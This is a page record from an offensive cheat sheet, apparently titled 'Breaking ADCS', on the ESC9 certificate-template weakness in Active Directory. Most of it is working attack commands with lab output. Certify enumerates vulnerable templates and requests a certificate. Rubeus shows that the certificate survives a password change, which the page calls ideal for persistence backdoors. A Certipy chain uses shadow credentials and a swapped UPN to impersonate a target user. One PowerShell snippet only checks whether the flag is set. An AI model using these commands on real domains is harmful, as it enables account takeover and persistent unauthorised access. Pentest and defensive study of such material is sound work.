{"title": "ESC9: NO_SECURITY_EXTENSION", "source": "breaking-adcs", "source_label": "Breaking ADCS", "path": "esc9", "html": "<p><strong>Conditions:</strong> Template has <code>NO_SECURITY_EXTENSION</code> enrollment flag. Certificates issued from this template survive password changes — ideal for persistence backdoors.</p>\n<h3>Enumerate + Check Flag</h3>\n<pre><code class=\"language-bash\">Certify.exe find /vulnerable</code></pre>\n<pre><code class=\"language-bash\">Certify.exe find /vulnerable\n\n    Template Name         : ESC9\n    mspki-enrollment-flag : NO_SECURITY_EXTENSION, INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n    pkiextendedkeyusage   : Client Authentication\n    Enrollment Rights     : ESSOS\\Domain Users    Access: Allow</code></pre>\n<h3>Request Certificate</h3>\n<pre><code class=\"language-bash\">Certify.exe request /ca:&lt;ca-host&gt;\\&lt;ca-name&gt; /template:&lt;template&gt;</code></pre>\n<pre><code class=\"language-bash\">Certify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:ESC9\n\n[*] Current user context : ESSOS\\missandei\n[*] CA Response          : The certificate has been issued.\n[*] Request ID           : 15</code></pre>\n<h3>Authenticate (Persistence Demo — Survives Password Change)</h3>\n<pre><code class=\"language-bash\">Rubeus.exe asktgt /user:&lt;username&gt; /certificate:&lt;username&gt;.pfx /password:mimikatz</code></pre>\n<pre><code class=\"language-bash\"># Initial auth\nRubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz\n[+] TGT request successful!\n\n# Change password\nnet user missandei &quot;NewComplexPassword123!&quot; /domain\nThe command completed successfully.\n\n# Certificate STILL works after password change!\nRubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz\n[+] TGT request successful!</code></pre>\n<h3>Check Flag via PowerShell</h3>\n<pre><code class=\"language-powershell\">$templateDN = &quot;CN=&lt;template&gt;,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=&lt;domain&gt;,DC=local&quot;\n$template = Get-ADObject -Identity $templateDN -Properties msPKI-Enrollment-Flag\nif ($template.&#x27;msPKI-Enrollment-Flag&#x27; -band 0x80000) {\n    Write-Host &quot;NO_SECURITY_EXTENSION flag is SET (vulnerable)&quot;\n}</code></pre>\n\n<h3>Alternative — Certipy (Linux)</h3>\n<pre><code class=\"language-bash\"># ESC9 (template has CT_FLAG_NO_SECURITY_EXTENSION - the SID extension is omitted, so UPN mapping is trusted).\n# Needs GenericWrite / shadow over a victim account.\ncertipy shadow auto -u &lt;username&gt;@&lt;domain&gt; -p &lt;password&gt; -account &lt;victim&gt; -dc-ip &lt;dc-ip&gt;\n# Point the victim's UPN at the target\ncertipy account update -u &lt;username&gt;@&lt;domain&gt; -p &lt;password&gt; -user &lt;victim&gt; -upn &lt;target-user&gt;@&lt;domain&gt; -dc-ip &lt;dc-ip&gt;\n# Enrol on the ESC9 template as the victim\ncertipy req -u &lt;victim&gt;@&lt;domain&gt; -hashes :&lt;victim-nt-hash&gt; -dc-ip &lt;dc-ip&gt; -target &lt;ca-host&gt; -ca &lt;ca-name&gt; -template &lt;template&gt;\n# Restore the victim UPN, then authenticate as the target\ncertipy account update -u &lt;username&gt;@&lt;domain&gt; -p &lt;password&gt; -user &lt;victim&gt; -upn &lt;victim&gt;@&lt;domain&gt; -dc-ip &lt;dc-ip&gt;\ncertipy auth -pfx &lt;target-user&gt;.pfx -domain &lt;domain&gt;</code></pre>", "excerpt": "Conditions: Template has NO_SECURITY_EXTENSION enrollment flag. Certificates issued from this template survive password changes — ideal for persistence backdoors. Enumerate + Check Flag Certify.exe fi", "tags": ["adcs", "active-directory", "certificates"]}